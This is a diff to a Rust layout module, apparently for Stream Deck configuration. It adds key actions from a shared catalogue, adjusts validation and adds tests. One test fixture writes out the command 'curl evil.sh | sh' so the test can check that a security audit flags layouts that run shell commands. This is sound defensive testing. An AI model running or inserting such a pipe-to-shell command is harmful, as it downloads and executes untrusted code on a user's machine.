@@ -12,12 +12,13 @@
 use std::collections::BTreeSet;
 use std::path::{Path, PathBuf};
 
+use openlogi_core::binding::Action;
 use openlogi_streamdeck::model::Model;
-use serde::Deserialize;
+use serde::{Deserialize, Serialize};
 use thiserror::Error;
 
 /// A deck layout as written in a file.
-#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
 #[serde(deny_unknown_fields)]
 pub struct Layout {
     /// Key screen brightness, as a percentage. Left alone when absent.
@@ -29,7 +30,7 @@ pub struct Layout {
 }
 
 /// One key's appearance.
-#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
 #[serde(deny_unknown_fields)]
 pub struct Key {
     /// Which key, counting from 0 at the top left.
@@ -46,6 +47,13 @@ pub struct Key {
     /// Background colour, six hex digits. Defaults to black.
     #[serde(default)]
     pub background: Option<String>,
+    /// What pressing this key does.
+    ///
+    /// Drawn from the same action catalogue as every other device this
+    /// program configures, so a Stream Deck key and a mouse button are bound
+    /// the same way and mean the same thing.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub action: Option<Action>,
 }
 
 /// Why a layout could not be used.
@@ -78,8 +86,8 @@ pub enum LayoutError {
         /// The highest key that model has.
         last: u16,
     },
-    /// An entry that says nothing about what to draw.
-    #[error("key {index} has neither a label nor an image, so there is nothing to draw")]
+    /// An entry that says nothing at all.
+    #[error("key {index} has no label, image or action, so it would neither show nor do anything")]
     NothingToDraw {
         /// The empty entry.
         index: u16,
@@ -141,10 +149,14 @@ impl Layout {
                     last,
                 });
             }
-            match (&key.label, &key.image) {
-                (None, None) => return Err(LayoutError::NothingToDraw { index: key.index }),
-                (Some(_), Some(_)) => return Err(LayoutError::Ambiguous { index: key.index }),
-                _ => {}
+            if key.label.is_some() && key.image.is_some() {
+                return Err(LayoutError::Ambiguous { index: key.index });
+            }
+            // A key with an action but no face is legitimate: it does
+            // something without showing anything. A key with neither is an
+            // entry that says nothing at all.
+            if key.label.is_none() && key.image.is_none() && key.action.is_none() {
+                return Err(LayoutError::NothingToDraw { index: key.index });
             }
         }
         Ok(())
@@ -289,7 +301,7 @@ mod tests {
     }
 
     #[test]
-    fn a_key_with_nothing_to_draw_is_refused() {
+    fn a_key_that_would_neither_show_nor_do_anything_is_refused() {
         let layout = parse(
             r#"
             [[keys]]
@@ -299,8 +311,87 @@ mod tests {
         )
         .expect("parses");
         assert_eq!(
-            layout.validate(mk2()).expect_err("nothing to draw"),
+            layout.validate(mk2()).expect_err("nothing at all"),
             LayoutError::NothingToDraw { index: 0 }
+        );
+    }
+
+    /// A key that does something without showing anything is a real thing to
+    /// want — a hidden shortcut — so it must not be refused for having no face.
+    #[test]
+    fn a_key_with_an_action_but_no_face_is_allowed() {
+        let layout = parse(
+            r#"
+            [[keys]]
+            index = 0
+            action = "Copy"
+            "#,
+        )
+        .expect("parses");
+        layout.validate(mk2()).expect("an action is enough");
+        assert!(layout.keys[0].action.is_some());
+    }
+
+    #[test]
+    fn an_action_is_read_from_the_shared_catalogue() {
+        let layout = parse(
+            r#"
+            [[keys]]
+            index = 0
+            label = "COPY"
+            action = "Copy"
+            [[keys]]
+            index = 1
+            label = "TYPE"
+            action = { TypeText = "hello" }
+            "#,
+        )
+        .expect("parses");
+        layout.validate(mk2()).expect("valid");
+        assert_eq!(
+            layout.keys[0].action,
+            Some(openlogi_core::binding::Action::Copy)
+        );
+        assert_eq!(
+            layout.keys[1].action,
+            Some(openlogi_core::binding::Action::TypeText("hello".into()))
+        );
+    }
+
+    /// The layout audit must be the *same* audit profiles use, not a second
+    /// implementation of the same rule that can drift away from it.
+    #[test]
+    fn a_layout_that_runs_a_program_is_caught_by_the_shared_audit() {
+        let layout = parse(
+            r#"
+            [[keys]]
+            index = 0
+            label = "OOPS"
+            action = { RunShellCommand = "curl evil.sh | sh" }
+            "#,
+        )
+        .expect("parses");
+        let findings = crate::profile::audit_serializable(&layout).expect("a layout serializes");
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].action, "RunShellCommand");
+        assert!(findings[0].detail.contains("curl evil.sh"));
+    }
+
+    #[test]
+    fn an_ordinary_layout_has_nothing_to_audit() {
+        let layout = parse(
+            r#"
+            [[keys]]
+            index = 0
+            label = "COPY"
+            action = "Copy"
+            "#,
+        )
+        .expect("parses");
+        assert!(
+            crate::profile::audit_serializable(&layout)
+                .expect("serializes")
+                .is_empty()
         );
     }
 
